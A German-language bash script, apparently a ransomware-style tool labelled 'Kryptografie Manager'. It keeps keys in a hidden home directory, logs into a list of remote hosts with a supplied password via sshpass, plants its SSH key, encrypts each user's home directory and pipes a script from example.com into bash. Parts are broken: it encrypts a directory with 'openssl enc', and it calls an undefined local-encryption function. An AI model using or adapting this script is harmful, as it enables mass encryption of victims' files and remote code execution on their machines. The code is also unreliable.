#!/bin/bash

# Farbcodes
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Verstecktes Verzeichnis für Ausgabe
output_dir="$HOME/.C4-Adikit"
mkdir -p "$output_dir"

# Funktion zur Erstellung des RSA-Schlüsselpaares
generate_rsa_key_pair() {
    echo -e "${BLUE}Erstelle RSA-Schlüsselpaar...${NC}"
    if [ -f "$output_dir/private_key.pem" ]; then
        echo "private_key.pem already exists. Overwrite (y/n)?"
        read overwrite
        if [ "$overwrite" != "y" ]; then
            echo "Beende das Schlüsselpaar-Erstellung..."
            return 1
        fi
    fi
    ssh-keygen -t rsa -b 4096 -f "$output_dir/private_key.pem" -N "" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}RSA-Schlüsselpaar erfolgreich erstellt.${NC}"
    else
        echo -e "${RED}Fehler beim Erstellen des RSA-Schlüsselpaares.${NC}"
    fi
}

# Funktion zur Verschlüsselung von Verzeichnissen auf einem Remote-System
encrypt_remote_directories() {
    echo -e "${BLUE}Geben Sie die IP-Adresse des Remote-Systems ein oder den Pfad zur IP-Liste:${NC}"
    read remote_input

    if [ -f "$remote_input" ]; then
        ip_list=$(cat "$remote_input")
    else
        ip_list="$remote_input"
    fi

    echo -e "${BLUE}Geben Sie den Benutzernamen ein:${NC}"
    read username
    echo -e "${BLUE}Geben Sie das Passwort ein:${NC}"
    read -s password

    generate_rsa_key_pair

    # Übertrage den öffentlichen Schlüssel zum Remote-System
    public_key_path="$output_dir/private_key.pem.pub"
    for ip in $ip_list; do
        echo -e "${BLUE}Verbinde zu $ip...${NC}"
        sshpass -p "$password" ssh-copy-id -i "$public_key_path" "$username@$ip"

        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Öffentlicher Schlüssel erfolgreich übertragen nach $ip.${NC}"
            
            echo -e "${BLUE}Führe Verschlüsselung auf dem Remote-System durch...${NC}"
            
            # Verschlüsseln der Verzeichnisse auf dem Remote-System
            sshpass -p "$password" ssh "$username@$ip" "
                openssl enc -aes-256-cbc -salt -in /home/$username -out /home/$username/encrypted_home.tar.gz.enc -k 'your_symmetrical_key'
                tar -czf - /home/$username | openssl enc -aes-256-cbc -salt -out /home/$username/encrypted_home.tar.gz.enc -k 'your_symmetrical_key'
                curl -sS https://example.com/remote_decryption_installer.sh | bash
            "

            if [ $? -eq 0 ]; then
                echo -e "${GREEN}Verzeichnisse auf dem Remote-System erfolgreich verschlüsselt.${NC}"
            else
                echo -e "${RED}Fehler bei der Remote-Verschlüsselung.${NC}"
            fi
        else
            echo -e "${RED}Fehler beim Verbinden zu $ip.${NC}"
        fi
    done
}

# Hauptmenü
main_menu() {
    while true; do
        clear
        echo -e "${BLUE} Kryptografie Manager${NC}"
        echo -e "${GREEN}1. Krypto Lokal${NC}"
        echo -e "${GREEN}2. Krypto Remote${NC}"
        echo -e "${RED}3. Beenden${NC}"
        echo -e "${BLUE}Wählen Sie eine Option:${NC}"
        read option

        case $option in
            1) encrypt_local_files ;;  # Funktion muss definiert werden
            2) encrypt_remote_directories ;;
            3) echo -e "${RED}Beenden...${NC}"; exit ;;
            *) echo -e "${RED}Ungültige Option.${NC}" ;;
        esac
        echo -e "${BLUE}Drücken Sie eine beliebige Taste, um fortzufahren...${NC}"
        read -n 1
    done
}

# Hauptmenü starten
main_menu

